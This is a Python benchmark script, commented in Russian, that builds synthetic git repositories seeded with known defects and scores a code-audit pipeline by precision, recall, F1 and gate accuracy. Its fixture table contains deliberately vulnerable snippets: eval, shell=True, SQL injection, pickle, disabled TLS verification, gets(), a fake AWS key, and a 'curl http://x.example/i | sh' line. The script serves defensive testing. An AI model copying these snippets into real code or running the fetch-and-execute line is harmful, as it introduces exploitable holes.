#!/usr/bin/env python3
"""Оценка качества конвейера на синтетических репозиториях с известными дефектами.

Для каждого репозитория известна «истина» (какие дефекты внедрены и где). После запуска
pipeline.py сравниваем множества пар (правило, файл): TP / FP / FN -> precision, recall, F1.
Дополнительно: точность решения quality gate и время работы.
Запуск:  python3 bench/bench.py [--repos 30] [--clean 6]
"""
import argparse, atexit, json, shutil, subprocess, sys, tempfile, time
from pathlib import Path

HERE = Path(__file__).resolve().parent
PIPE = HERE.parent / "pipeline.py"
# Контрольные примеры: параметризованный SQL и запуск команд списком аргументов.
CLEAN = '''"""Clean module {i}."""
import json
import subprocess


def load(path):
    with open(path) as fh:
        return json.load(fh)


class Reader:
    """Reads json."""

    def read(self, path):
        return load(path)


def query(cursor, name):
    return cursor.execute("SELECT * FROM users WHERE name = ?", (name,))


def run_command(arguments):
    return subprocess.run(arguments, check=True)


def documentation_example():
    return "Avoid eval and untrusted SQL; use parameters and argument lists."
'''

# Имя дефекта -> (файл, содержимое, [(правило, категория)], есть ли high/critical).
D = {
 "eval": ("d_eval.py", "def run(x):\n    return eval(x)\n", [("dangerous-eval", "vulnerability")], True),
 "shell": ("d_shell.py", 'import subprocess\n\n\ndef run(cmd):\n    subprocess.run("ls " + cmd, shell=True)\n', [("shell-true", "vulnerability")], False),
 "secret": ("d_secret.py", 'DB_PASSWORD = "Sup3rSecretPass"\n', [("hardcoded-credential", "secret")], True),
 "syntax": ("d_syntax.py", "def broken(:\n    pass\n", [("syntax-error", "error")], True),
 "bare": ("d_bare.py", "def f():\n    try:\n        return 1\n    except:\n        return 0\n", [("bare-except", "style")], False),
 "unused": ("d_unused.py", "import os\nimport sys\n\n\ndef f():\n    return sys.argv\n", [("unused-import", "style")], False),
 "mutable": ("d_mutable.py", "def add(item, bucket=[]):\n    bucket.append(item)\n    return bucket\n", [("mutable-default", "error")], False),
 "complex": ("d_complex.py", "def check(x):\n" + "".join(f"    if x == {k}:\n        return {k}\n" for k in range(12)) + "    return 0\n", [("high-complexity", "style")], False),
 "longline": ("d_long.py", "# " + "x" * 150 + "\n", [("line-too-long", "style")], False),
 "sqli": ("d_sqli.py", "def q(cur, name):\n    cur.execute(\"SELECT * FROM t WHERE n='\" + name + \"'\")\n", [("sql-injection", "vulnerability")], True),
 "md5": ("d_md5.py", "import hashlib\n\n\ndef h(x):\n    return hashlib.md5(x).hexdigest()\n", [("weak-hash", "vulnerability")], False),
 "pickle": ("d_pickle.py", "import pickle\n\n\ndef load(b):\n    return pickle.loads(b)\n", [("unsafe-deserialization", "vulnerability")], False),
 "tls": ("d_tls.py", "import requests\n\n\ndef get(u):\n    return requests.get(u, verify=False)\n", [("tls-verify-disabled", "vulnerability")], False),
 "wildcard": ("d_wild.py", "from os.path import *\n", [("wildcard-import", "style")], False),
 "nonecmp": ("d_none.py", "def f(a):\n    return a == None\n", [("none-comparison", "style")], False),
 "todo": ("d_todo.py", "# TODO: refactor this\nx = 1\n", [("todo-marker", "style")], False),
 "trail": ("d_trail.py", "x = 1   \n", [("trailing-whitespace", "style")], False),
 "noeol": ("d_noeol.py", "x = 1", [("missing-eof-newline", "style")], False),
 "jseval": ("d_app.js", "function f(x) { return eval(x); }\n", [("js-eval", "vulnerability")], True),
 "cgets": ("d_app.c", "#include <stdio.h>\nint main(void) { char b[8]; gets(b); return 0; }\n", [("c-unsafe-func", "vulnerability")], True),
 "curlsh": ("d_install.sh", "#!/bin/sh\ncurl http://x.example/i | sh\n", [("sh-curl-pipe", "vulnerability")], True),
}
GIT = ["weak-message", "forbidden-file", "history-secret", "huge-commit", "large-blob"]
GIT_TRUTH = {"weak-message": ("weak-message", "", "git", False),
             "forbidden-file": ("forbidden-file", "server.pem", "git", True),
             "history-secret": ("aws-access-key", "notes.txt", "secret", True),
             "huge-commit": ("huge-commit", "", "git", False),
             "large-blob": ("large-blob", "data.bin", "git", False)}


def _create_work_dir(parent):
    parent = Path(parent)
    parent.mkdir(parents=True, exist_ok=True)
    work = Path(tempfile.mkdtemp(prefix="codeaudit_bench_", dir=parent))
    atexit.register(shutil.rmtree, work, ignore_errors=True)
    return work


def g(repo, *a):
    subprocess.run(["git", "-c", "user.name=Dev", "-c", "user.email=dev@example.com", "-C", str(repo), *a],
                   check=True, capture_output=True)


def commit(repo, msg):
    g(repo, "add", "-A")
    g(repo, "commit", "-q", "-m", msg)


def build(repo, defects, gits):
    repo.mkdir(parents=True)
    g(repo, "init", "-q")
    truth, high = set(), False
    cats = {}
    for i in range(3):
        (repo / f"clean_{i}.py").write_text(CLEAN.format(i=i), encoding="utf-8")
        commit(repo, f"Add clean module {i} with reader")
    for name in defects:
        fn, content, rules, hi = D[name]
        (repo / fn).write_text(content, encoding="utf-8")
        commit(repo, f"Add {name} implementation module")
        for r, c in rules:
            truth.add((r, fn)); cats[r] = c
        high |= hi
    for name in gits:
        rule, key, cat, hi = GIT_TRUTH[name]
        truth.add((rule, key)); cats[rule] = cat; high |= hi
        if name == "weak-message":
            (repo / "misc.py").write_text(CLEAN.format(i=99), encoding="utf-8"); commit(repo, "wip")
        elif name == "forbidden-file":
            (repo / "server.pem").write_text("dummy\n", encoding="utf-8"); commit(repo, "Add server certificate file")
            g(repo, "rm", "-q", "server.pem"); commit(repo, "Remove server certificate file")
        elif name == "history-secret":
            (repo / "notes.txt").write_text("key=AKIAABCDEFGHIJKLMNOP\n", encoding="utf-8"); commit(repo, "Add notes file with key")
            g(repo, "rm", "-q", "notes.txt"); commit(repo, "Remove notes file")
        elif name == "huge-commit":
            for k in range(60):
                (repo / f"h{k}.py").write_text(CLEAN.format(i=k), encoding="utf-8")
            commit(repo, "Bulk import of generated modules")
        elif name == "large-blob":
            (repo / "data.bin").write_bytes(bytes(6 * 1048576)); commit(repo, "Add large binary data blob")
    return truth, high, cats


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--repos", type=int, default=30)
    ap.add_argument("--clean", type=int, default=6)
    ap.add_argument("--work", default=None,
                    help="родительская папка для временных репозиториев (сама папка не удаляется)")
    a = ap.parse_args()
    work_parent = Path(a.work).expanduser().resolve() if a.work else Path(tempfile.gettempdir())
    work = _create_work_dir(work_parent)
    names = list(D)
    allcats, scored = {}, set()
    for n in names:
        for r, c in D[n][2]:
            allcats[r] = c; scored.add(r)
    for n in GIT:
        allcats[GIT_TRUTH[n][0]] = GIT_TRUTH[n][2]; scored.add(GIT_TRUTH[n][0])
    stat = {r: [0, 0, 0] for r in scored}   # Количество TP, FP и FN по каждому правилу.
    gate_ok = gate_n = 0
    times, fp_clean = [], 0
    jobs = [(i, [names[(i * 4 + k) % len(names)] for k in range(5)],
             [GIT[(i + k) % len(GIT)] for k in range(i % 3 + 1)]) for i in range(a.repos)]
    jobs += [(a.repos + j, [], []) for j in range(a.clean)]
    for idx, defects, gits in jobs:
        repo = work / f"r{idx}"
        truth, high, _ = build(repo, defects, gits)
        t0 = time.time()
        p = subprocess.run([sys.executable, str(PIPE), str(repo), "--out", str(work / f"out{idx}")],
                           capture_output=True, text=True, encoding="utf-8", errors="replace")
        times.append(time.time() - t0)
        found = {(f["rule"], f["file"]) for f in
                 json.load(open(work / f"out{idx}" / "report.json", encoding="utf-8"))["findings"] if f["rule"] in scored}
        for r, f in found & truth: stat[r][0] += 1
        for r, f in found - truth: stat[r][1] += 1
        for r, f in truth - found: stat[r][2] += 1
        if not defects and not gits:
            fp_clean += len(found)
        gate_n += 1
        gate_ok += (p.returncode == 1) == high
        shutil.rmtree(repo, ignore_errors=True)
    def prf(tp, fp, fn):
        pr = tp / (tp + fp) if tp + fp else 1.0
        rc = tp / (tp + fn) if tp + fn else 1.0
        return pr, rc, (2 * pr * rc / (pr + rc) if pr + rc else 0.0)
    rows, cat_tot = [], {}
    for r in sorted(scored, key=lambda x: (allcats[x], x)):
        tp, fp, fn = stat[r]
        pr, rc, f1 = prf(tp, fp, fn)
        rows.append((r, allcats[r], tp, fp, fn, pr, rc, f1))
        t = cat_tot.setdefault(allcats[r], [0, 0, 0])
        for k in range(3): t[k] += stat[r][k]
    tot = [sum(stat[r][k] for r in scored) for k in range(3)]
    md = [f"Репозиториев с дефектами: {a.repos}, чистых контрольных: {a.clean}. "
          f"Внедрено дефектов (пар правило+файл): {tot[0] + tot[2]}.", "",
          "| Правило | Категория | TP | FP | FN | Precision | Recall | F1 |", "|---|---|---|---|---|---|---|---|"]
    md += [f"| {r} | {c} | {tp} | {fp} | {fn} | {pr:.2f} | {rc:.2f} | {f1:.2f} |" for r, c, tp, fp, fn, pr, rc, f1 in rows]
    md += ["", "| Категория | TP | FP | FN | Precision | Recall | F1 |", "|---|---|---|---|---|---|---|"]
    for c, (tp, fp, fn) in sorted(cat_tot.items()):
        pr, rc, f1 = prf(tp, fp, fn)
        md.append(f"| {c} | {tp} | {fp} | {fn} | {pr:.2f} | {rc:.2f} | {f1:.2f} |")
    pr, rc, f1 = prf(*tot)
    md.append(f"| **всего** | {tot[0]} | {tot[1]} | {tot[2]} | {pr:.2f} | {rc:.2f} | {f1:.2f} |")
    md += ["", f"- Ложные срабатывания на чистых репозиториях: {fp_clean}",
           f"- Верных решений quality gate: {gate_ok}/{gate_n} ({100 * gate_ok / gate_n:.0f}%)",
           f"- Среднее время анализа репозитория: {sum(times) / len(times):.2f} с (макс. {max(times):.2f} с)"]
    (HERE / "results.md").write_text("\n".join(md), encoding="utf-8")
    (HERE / "results.json").write_text(json.dumps({"precision": pr, "recall": rc, "f1": f1, "gate_accuracy": gate_ok / gate_n,
                                                   "avg_time_s": sum(times) / len(times), "fp_on_clean": fp_clean}, indent=2), encoding="utf-8")
    print("\n".join(md))
    shutil.rmtree(work, ignore_errors=True)


if __name__ == "__main__":
    main()
